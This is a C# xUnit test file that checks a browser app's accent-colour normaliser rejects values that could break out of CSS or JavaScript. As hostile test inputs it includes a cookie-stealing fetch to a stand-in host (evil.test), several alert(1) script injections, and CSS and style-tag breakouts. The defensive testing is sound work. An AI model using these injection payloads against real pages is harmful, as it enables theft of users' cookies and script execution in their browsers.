using StrideBrowser.Services;
using Xunit;

namespace StrideBrowser.Tests;

/// <summary>
/// AccentColor is written straight into a CSS custom property and into a JavaScript string
/// literal. SettingsStore normalises it on load, which is the rule the renderers rely on.
/// </summary>
public sealed class SettingsStoreAccentColorTests
{
    [Theory]
    [InlineData("#D4A574")]
    [InlineData("#abc")]
    [InlineData("#ABCDEF")]
    [InlineData("#ffffff")]
    [InlineData("  #ff0000  ")]
    public void NormalizeAccentColor_ValidHex_IsKept(string value)
    {
        Assert.Equal(value.Trim(), SettingsStore.NormalizeAccentColor(value));
    }

    /// <summary>
    /// A hand-edited settings.json is deserialized straight into the model, so a value that
    /// would break out of a JS literal has to fall back to the default here.
    /// </summary>
    [Theory]
    [InlineData("\";alert(1);//")]
    [InlineData("#D4A574\";fetch('http://evil.test/'+document.cookie);//")]
    [InlineData("red; background-image: url(http://evil.test/x)")]
    [InlineData("#12345")]
    [InlineData("#1234567")]
    [InlineData("D4A574")]
    [InlineData("#GGGGGG")]
    [InlineData("</style><script>alert(1)</script>")]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void NormalizeAccentColor_InvalidValue_FallsBackToDefault(string? value)
    {
        var result = SettingsStore.NormalizeAccentColor(value);

        Assert.Equal("#D4A574", result);
        Assert.Matches("^#[0-9a-fA-F]{3}$|^#[0-9a-fA-F]{6}$", result);
    }

    /// <summary>
    /// Whatever the input, the value that reaches the page can never close a JS string literal
    /// or a style block.
    /// </summary>
    [Theory]
    [InlineData("\");alert(1);//")]
    [InlineData("#000\";window.chrome.webview.postMessage('x');//")]
    [InlineData("</style></head><body><script>alert(1)</script>")]
    public void NormalizeAccentColor_NeverEmitsQuoteOrTagCharacters(string hostile)
    {
        var result = SettingsStore.NormalizeAccentColor(hostile);

        Assert.DoesNotContain("\"", result);
        Assert.DoesNotContain("'", result);
        Assert.DoesNotContain("<", result);
        Assert.DoesNotContain(">", result);
    }
}
